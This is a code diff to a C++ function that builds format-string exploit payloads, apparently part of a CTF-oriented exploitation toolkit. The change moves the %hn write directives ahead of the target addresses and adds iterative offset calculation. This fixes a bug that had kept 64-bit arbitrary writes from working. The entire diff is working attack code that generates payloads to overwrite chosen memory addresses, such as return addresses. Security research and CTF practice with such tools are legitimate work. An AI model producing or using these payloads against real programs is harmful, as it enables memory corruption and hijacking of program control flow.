@@ -90,38 +90,25 @@ core::Result<std::vector<std::uint8_t>> build_write_payload(const WriteSpec& spe
     const unsigned bits = arch::arch_bits(spec.arch);
     const std::size_t ptr_size = (bits == 64) ? 8u : 4u;
 
-    // Pack the address as ptr_size bytes (little-endian). The classic
-    // 4-byte-write technique writes the value as four 16-bit halves,
-    // each via %hn, to keep the format-string format operand small.
-    // We embed the four target addresses + padding bytes + the printf
-    // format string with embedded %c counts.
+    // QA round 2 CRITICAL fix: layout is now directives-first,
+    // addresses-last (matches pwntools fmtstr_payload). The
+    // previous layout placed the 64-bit addresses at the front
+    // where their NUL upper bytes terminated printf's format-
+    // string scan and the %n directives never ran.
     //
-    // Layout:
-    //   [pad]
-    //   [target+0][target+2][target+4][target+6]      (ptr_size each)
-    //   "%<low_16>c %<delta1>c%<arg+0>$hn ..."
+    // New layout (target ptr_size = 8):
+    //   "%<delta1>c%<addr_slot+0>$hn..."          <- directives
+    //   <padding to ptr_size alignment>
+    //   <addr+0><addr+2><addr+4><addr+6>
     //
-    // For simplicity in v0.1 we emit the four addresses and the
-    // format string components separately, joined with the
-    // appropriate `%c` widths. This is enough for callers to build a
-    // working ret-overwrite under a typical 32-bit format-string CTF.
-    std::vector<std::uint8_t> out;
-    out.reserve(64);
-
-    auto push_addr = [&](std::uint64_t addr) {
-        for (std::size_t i = 0; i < ptr_size; ++i) {
-            out.push_back(static_cast<std::uint8_t>((addr >> (i * 8)) & 0xffU));
-        }
-    };
-
-    for (std::size_t i = 0; i < spec.padding; ++i) {
-        out.push_back('A');
-    }
-
-    push_addr(spec.target_address + 0);
-    push_addr(spec.target_address + 2);
-    push_addr(spec.target_address + 4);
-    push_addr(spec.target_address + 6);
+    // spec.arg_index is the arg slot where the user's buffer
+    // STARTS being read as format args (pwntools "offset"
+    // semantics). The first address lands at arg slot
+    //   slot0 = arg_index + ceil(directive_blob_size / ptr_size)
+    // The directive blob references slot0..slot0+3. Because the
+    // %d-style counts and arg indices are themselves digits whose
+    // count depends on the magnitude, we iterate until the
+    // computed slot0 stops changing (usually 2-3 passes).
 
     const std::array<std::uint16_t, 4> halves = {
         static_cast<std::uint16_t>((spec.value >> 0) & 0xffffU),
@@ -130,39 +117,83 @@ core::Result<std::vector<std::uint8_t>> build_write_payload(const WriteSpec& spe
         static_cast<std::uint16_t>((spec.value >> 48) & 0xffffU),
     };
 
-    // Build the format string. For each half we emit `%<delta>c` to
-    // bring the running counter up, followed by `%N$hn` where N is
-    // the arg index that points to the next address slot.
-    //
-    // Sort halves by ascending count so each %c contribution is
-    // non-negative.
+    // ordered: pairs of (half_value, slot_index_offset_relative_to_slot0)
     std::array<std::pair<std::uint16_t, std::size_t>, 4> ordered = {{
-        {halves[0], spec.arg_index + 0},
-        {halves[1], spec.arg_index + 1},
-        {halves[2], spec.arg_index + 2},
-        {halves[3], spec.arg_index + 3},
+        {halves[0], 0U},
+        {halves[1], 1U},
+        {halves[2], 2U},
+        {halves[3], 3U},
     }};
     std::sort(ordered.begin(), ordered.end(), [](const auto& a, const auto& b) {
         return a.first < b.first;
     });
 
-    std::string fmt_str;
-    std::uint32_t produced = static_cast<std::uint32_t>(out.size());
-    for (const auto& [half, arg_idx] : ordered) {
-        std::int64_t need =
-            static_cast<std::int64_t>(half) - static_cast<std::int64_t>(produced & 0xffffU);
-        if (need <= 0) {
-            need += 0x10000;
+    auto build_format_blob = [&](std::size_t slot0) {
+        std::string fmt_str;
+        std::uint32_t produced = static_cast<std::uint32_t>(spec.padding);
+        for (const auto& [half, slot_off] : ordered) {
+            std::int64_t need =
+                static_cast<std::int64_t>(half) - static_cast<std::int64_t>(produced & 0xffffU);
+            if (need <= 0) {
+                need += 0x10000;
+            }
+            char buf[64];
+            std::snprintf(
+                buf, sizeof buf, "%%%lldc%%%zu$hn", static_cast<long long>(need), slot0 + slot_off);
+            fmt_str.append(buf);
+            produced += static_cast<std::uint32_t>(need);
         }
-        char buf[64];
-        std::snprintf(buf, sizeof buf, "%%%lldc%%%zu$hn", static_cast<long long>(need), arg_idx);
-        fmt_str.append(buf);
-        produced += static_cast<std::uint32_t>(need);
+        return fmt_str;
+    };
+
+    // Iterate until slot0 converges. Round-up division gives the
+    // smallest number of ptr_size slots the directive blob occupies.
+    std::size_t slot0 = spec.arg_index;
+    std::string fmt_str;
+    for (int iter = 0; iter < 8; ++iter) {
+        fmt_str = build_format_blob(slot0);
+        const std::size_t total_dir_bytes = spec.padding + fmt_str.size();
+        const std::size_t slots_consumed = (total_dir_bytes + ptr_size - 1) / ptr_size;
+        const std::size_t new_slot0 = spec.arg_index + slots_consumed;
+        if (new_slot0 == slot0) {
+            break;
+        }
+        slot0 = new_slot0;
     }
 
+    std::vector<std::uint8_t> out;
+    out.reserve(spec.padding + fmt_str.size() + 4 * ptr_size + ptr_size);
+
+    // Optional fixed padding (legacy --padding flag still honored)
+    for (std::size_t i = 0; i < spec.padding; ++i) {
+        out.push_back('A');
+    }
+
+    // Directives.
     for (char c : fmt_str) {
         out.push_back(static_cast<std::uint8_t>(c));
     }
+
+    // Pad to ptr_size alignment with a printable filler ('a') so the
+    // pre-address bytes never include a NUL that would terminate
+    // printf early.
+    while ((out.size() % ptr_size) != 0) {
+        out.push_back(static_cast<std::uint8_t>('a'));
+    }
+
+    // Addresses at the END of the payload. Their NUL upper bytes
+    // are now safely past every %hn directive that printf needs
+    // to process.
+    auto push_addr = [&](std::uint64_t addr) {
+        for (std::size_t i = 0; i < ptr_size; ++i) {
+            out.push_back(static_cast<std::uint8_t>((addr >> (i * 8)) & 0xffU));
+        }
+    };
+    push_addr(spec.target_address + 0);
+    push_addr(spec.target_address + 2);
+    push_addr(spec.target_address + 4);
+    push_addr(spec.target_address + 6);
+
     return out;
 }
 
